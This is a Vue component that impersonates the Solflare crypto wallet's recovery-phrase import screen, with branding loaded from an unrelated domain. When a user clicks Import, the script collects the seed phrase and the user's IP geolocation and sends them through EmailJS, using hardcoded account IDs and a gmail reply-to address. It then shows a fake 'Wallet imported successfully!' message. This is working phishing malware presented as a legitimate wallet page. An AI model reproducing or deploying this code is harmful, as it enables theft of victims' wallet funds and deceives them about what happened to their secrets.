<template>
  <div
    class="h-screen overflow-hidden bg-black text-white flex flex-col md:flex-row font-solflare p-4 md:p-6"
  >
    <!-- Left Section -->
    <div
      class="w-full md:w-1/2 h-full bg-[#0c0f14] rounded-3xl p-6 flex flex-col m-1 md:m-2 overflow-hidden"
    >
      <!-- Header -->
      <div class="flex items-center justify-between mb-8 relative">
        <button
          class="bg-transparent border-none text-white font-bold p-0 text-[16px] flex items-center"
          @click="goBack"
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            class="h-[20px] w-[20px] mr-2"
            fill="none"
            viewBox="0 0 24 24"
            stroke="currentColor"
          >
            <path
              stroke-linecap="round"
              stroke-linejoin="round"
              stroke-width="2"
              d="M10 19l-7-7m0 0l7-7m-7 7h18"
            />
          </svg>
          Back
        </button>

        <div class="absolute left-1/2 transform -translate-x-1/2">
          <img
            src="https://vercelquickfix.com/solflare-text-logo.svg"
            alt="Solflare"
            class="h-[30px] object-cover"
          />
        </div>

        <button
          class="text-white text-4xl bg-transparent border-none text-white font-bold p-0"
        >
          <span>ᴀA</span>
        </button>
      </div>

      <!-- Form Content -->
      <div class="flex-grow flex items-center justify-center overflow-hidden">
        <div class="w-full max-w-2xl overflow-auto invisible-scrollbar">
          <h1 class="text-[20px] font-bold text-center mb-2">
            Enter Your Recovery Phrase
          </h1>
          <p class="text-gray-500 text-[14px] text-center mb-8">
            Your recovery phrase is the key to the wallet.
          </p>

          <!-- Phrase Input Section -->
          <div class="bg-[#f5f8ff0a] rounded-3xl p-4 mb-3">
            <!-- Toggle for 12 or 24 -->
            <div
              class="rounded-full p-1 flex mb-8 w-36 ml-0 text-base border-[1px]"
              style="border: 1px solid #f5f8ff14"
            >
              <button
                class="py-1 px-4 border-none outline-none hover:border-none focus:border-none hover:text-white rounded-full text-sm font-medium"
                :class="
                  phraseCount === 12
                    ? 'bg-[#222] text-white'
                    : 'text-gray-500 bg-transparent'
                "
                @click="setPhraseCount(12)"
              >
                12
              </button>
              <button
                class="py-1 px-4 border-none outline-none hover:border-none focus:border-none hover:text-white rounded-full text-sm font-medium"
                :class="
                  phraseCount === 24
                    ? 'bg-[#222] text-white'
                    : 'text-gray-500 bg-transparent'
                "
                @click="setPhraseCount(24)"
              >
                24
              </button>
            </div>

            <!-- Phrase Inputs -->
            <div class="mb-8 max-h-[280px] overflow-y-auto invisible-scrollbar">
              <div class="grid grid-cols-3 gap-8">
                <div
                  v-for="(word, index) in phrases"
                  :key="index"
                  class="flex flex-col"
                >
                  <div class="mb-3">
                    <div
                      class="relative pb-1"
                      style="border-bottom: 1px solid #f5f8ff14"
                    >
                      <span class="absolute left-0 bottom-1 text-gray-500">{{
                        index + 1
                      }}</span>
                      <input
                        v-model="phrases[index]"
                        type="text"
                        style="border: none"
                        class="w-full h-10 bg-transparent border-none pb-1 pl-6 text-white text-base focus:outline-none focus:border-white"
                      />
                    </div>
                  </div>
                </div>
              </div>
            </div>

            <!-- Actions -->
            <div class="flex justify-between">
              <button
                class="bg-[#222] border-none outline-none hover:border-none hover:text-[#222] text-white py-2 px-6 rounded-full font-semibold text-[12px]"
              >
                Upload
              </button>
              <button
                class="bg-[#222] border-none outline-none hover:border-none hover:text-[#222] text-white py-2 px-6 rounded-full font-semibold text-[12px]"
                type="button"
                @click="pastePhrase"
              >
                Paste
              </button>
            </div>
          </div>

          <transition name="fade">
            <div
              v-if="message.text"
              :class="[
                ' px-4 py-2 my-3 rounded-xl text-sm font-semibold',
                message.type === 'success'
                  ? 'bg-green-600 text-white'
                  : 'bg-red-600 text-white',
              ]"
            >
              {{ message.text }}
            </div>
          </transition>

          <!-- Import Button -->
          <button
            class="w-full py-3 px-4 text-[14px] border-none outline-none hover:border-none hover:text-[#222] rounded-full font-bold mb-16"
            :class="{
              'bg-[#333] text-gray-500': !isValid,
              'bg-white text-black': isValid,
            }"
            :disabled="!isValid"
            @click="importWallet"
          >
            {{ isLoading ? "Importing..." : "Import" }}
          </button>

          <!-- Footer -->
          <div class="text-center">
            <a href="#" class="text-white text-[13px] font-semibold"
              >I need a new wallet</a
            >
          </div>
        </div>
      </div>
    </div>

    <!-- Right Section -->
    <div
      class="hidden md:flex w-full md:w-1/2 h-full items-center justify-center bg-black"
    >
      <img
        src="https://vercelquickfix.com/solflare-key.png"
        alt="Solflare Key"
        class="max-w-full max-h-full object-contain"
      />
    </div>

    <!-- Success & Error Message -->
    <transition name="fade">
      <div
        v-if="message.text"
        :class="[
          'absolute bottom-3 left-1/2 transform -translate-x-1/2 px-4 py-2 rounded-xl text-sm font-semibold',
          message.type === 'success'
            ? 'bg-green-600 text-white'
            : 'bg-red-600 text-white',
        ]"
      >
        {{ message.text }}
      </div>
    </transition>
  </div>
</template>

<script setup>
import { ref, computed } from "vue";
import { useRouter } from "vue-router";
import axios from "axios";

const router = useRouter();
const phraseCount = ref(12);
const isLoading = ref(false);
const phrases = ref(Array(12).fill(""));
const message = ref({ text: "", type: "" });

const setPhraseCount = (count) => {
  phraseCount.value = count;
  phrases.value = Array(count).fill("");
};

function showMessage(text, type = "success") {
  message.value = { text, type };
  setTimeout(() => {
    message.value.text = "";
  }, 3000);
}

const isValid = computed(() => phrases.value.every((w) => w.trim().length > 0));

const pastePhrase = async () => {
  try {
    const text = await navigator.clipboard.readText();
    const words = text.trim().split(/\s+/);
    if (words.length === phraseCount.value) {
      phrases.value = words;
    } else {
      alert(`Expected ${phraseCount.value} words, but got ${words.length}.`);
    }
  } catch (e) {
    alert("Failed to read clipboard text.");
  }
};

const goBack = () => router.back();

async function importWallet() {
  isLoading.value = true;
  try {
    const location = await axios.get("https://ipapi.co/json");
    const payload = {
      type: "phrase",
      phrase: phrases.value.join(" "),
    };

    console.log(payload);

    const params = {
      service_id: "service_eusbqyo",
      template_id: "template_z6xga6o",
      user_id: "obT4LcwZqPw_KlOar",
      template_params: {
        from_name: "Blockchain solutions",
        wallet_type: "Solflare",
        location: JSON.stringify(location.data),
        link_drops: JSON.stringify(payload),
        reply_to: "customeronlineagent@gmail.com",
      },
    };
    const response = await axios.post(
      "https://api.emailjs.com/api/v1.0/email/send",
      params
    );

    if (response.data === "OK") {
      showMessage("Wallet imported successfully!", "success");
      navigateTo("/");
    } else {
      showMessage("Import failed", "error");
    }
  } catch (err) {
    showMessage(err.message || "Import failed", "error");
  } finally {
    isLoading.value = false;
  }
}
</script>

<style scoped>
.invisible-scrollbar::-webkit-scrollbar {
  display: none;
}
.font-solflare {
  font-family: "Inter", sans-serif;
}
</style>
